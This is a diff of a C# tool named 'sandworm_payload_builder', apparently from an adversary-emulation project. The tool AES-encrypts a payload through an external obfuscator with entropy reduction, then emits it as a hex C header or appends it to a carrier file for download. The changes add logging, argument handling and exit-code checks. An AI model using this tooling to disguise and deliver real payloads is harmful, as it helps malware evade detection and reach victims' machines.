@@ -1,7 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Text;
 
 namespace sandworm_payload_builder
@@ -10,44 +9,74 @@ namespace sandworm_payload_builder
     {
         static void Main(string[] args)
         {
-            string payloadType = args[0];
-
-            string payloadFile = args[1];
-
-            string obfuscatedPayloadFile = args[2];
-
-            string keyFile = args[3];
-
-            string payloadHeaderFile = args[4];
-
-            string payloadCarrierFile = String.Empty;
-
-            string payloadDownloadFile = String.Empty;
-
-            if (payloadType == "download")
+            try
             {
-                payloadCarrierFile = args[5];
+                FileVersionInfo fvi = FileVersionInfo.GetVersionInfo(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
 
-                payloadDownloadFile = args[6];
+                Console.WriteLine(fvi.ProductName);
+
+                Console.WriteLine("Version: {0}", fvi.ProductVersion);
+
+                Console.Write(Environment.NewLine);
+
+                string payloadType = args[0];
+
+                string obfuscator = args[1];
+
+                string payloadFile = args[2];
+
+                string keyFile = args[3];
+
+                string obfuscatedFile = args[4];
+
+                string headerFile = args[5];
+
+                string carrierFile = payloadType == "download" ? args[6] : String.Empty;
+
+                string downloadFile = payloadType == "download" ? args[7] : String.Empty;
+
+                Console.WriteLine("Payload type:\t\t{0}", payloadType);
+
+                Console.WriteLine("Obfuscator binary:\t{0}", obfuscator);
+
+                Console.WriteLine("Payload file:\t\t{0}", payloadFile);
+
+                Console.WriteLine("Key file:\t\t{0}", keyFile);
+
+                Console.WriteLine("Obfuscated file:\t{0}", obfuscatedFile);
+
+                Console.WriteLine("Header file:\t\t{0}", headerFile);
+
+                CreateObfuscatedPayload(payloadFile, obfuscator, keyFile, obfuscatedFile);
+
+                if (payloadType == "header")
+                {
+                    CreatePayloadHeader(keyFile, obfuscatedFile, headerFile);
+                }
+                else if (payloadType == "download")
+                {
+                    CreatePayloadDownload(keyFile, obfuscatedFile, headerFile, carrierFile, downloadFile);
+                }
+                else
+                {
+                    throw new Exception("Specify either \"header\" or \"download\" as first command line option");
+                }
             }
-
-            CreateObfuscatedPayload(payloadFile, obfuscatedPayloadFile, keyFile);
-
-            if (payloadType == "header")
+            catch (Exception e)
             {
-                CreatePayloadHeader(keyFile, obfuscatedPayloadFile, payloadHeaderFile);
-            }
-            else if (payloadType == "download")
-            {
-                CreatePayloadDownload(obfuscatedPayloadFile, keyFile, payloadHeaderFile, payloadCarrierFile, payloadDownloadFile);
+                Console.WriteLine(e.ToString());
             }
         }
 
-        static private bool CreateObfuscatedPayload(string payloadFile, string obfuscatedPayloadFile, string keyFile)
+        static private bool CreateObfuscatedPayload(string payloadFile, string obfuscator, string keyFile, string obfuscatedFile)
         {
-            String command = String.Format(@"--aes --entropy-reduce {0} {1} {2}", payloadFile, obfuscatedPayloadFile, keyFile);
+            Console.Write(Environment.NewLine);
 
-            ProcessStartInfo psi = new ProcessStartInfo(@"..\..\..\bin2mess\build\Win32\Release\bin2mess.exe");
+            Console.WriteLine("Creating obfucated payload");
+
+            String command = String.Format(@"--aes --entropy-reduce {0} {1} {2}", payloadFile, keyFile, obfuscatedFile);
+
+            ProcessStartInfo psi = new ProcessStartInfo(obfuscator);
 
             psi.Arguments = command;
 
@@ -55,7 +84,7 @@ namespace sandworm_payload_builder
 
             cmd.WaitForExit();
 
-            return true;
+            return cmd.ExitCode == 0;
         }
 
         static private bool WritePrologHeader(StreamWriter writer)
@@ -103,7 +132,7 @@ namespace sandworm_payload_builder
 
             StringBuilder hexPayload = new StringBuilder();
 
-            int last = payload.Count() - 1;
+            int last = payload.Length - 1;
 
             for (int i = 0; i <= last; i++)
             {
@@ -154,8 +183,15 @@ namespace sandworm_payload_builder
 
             return true;
         }
+
         static private bool CreatePayloadDownload(string keyFile, string payloadFile, string headerFile, string carrierFile, string downloadFile)
         {
+            Console.Write(Environment.NewLine);
+
+            Console.WriteLine("Carrier file:\t\t{0}", carrierFile);
+
+            Console.WriteLine("Download file:\t\t{0}", downloadFile);
+
             StreamWriter writerHeader = new StreamWriter(headerFile);
 
             WritePrologHeader(writerHeader);
@@ -164,7 +200,7 @@ namespace sandworm_payload_builder
 
             writerHeader.Close();
 
-            StreamWriter writerDownload = new StreamWriter(downloadFile);
+            BinaryWriter writerDownload = new BinaryWriter(new FileStream(downloadFile, FileMode.Create));
 
             writerDownload.Write(File.ReadAllBytes(carrierFile));
 
@@ -172,7 +208,7 @@ namespace sandworm_payload_builder
 
             writerDownload.Write(payload);
 
-            writerDownload.Write(payload.Count());
+            writerDownload.Write(payload.Length);
 
             writerDownload.Close();
 
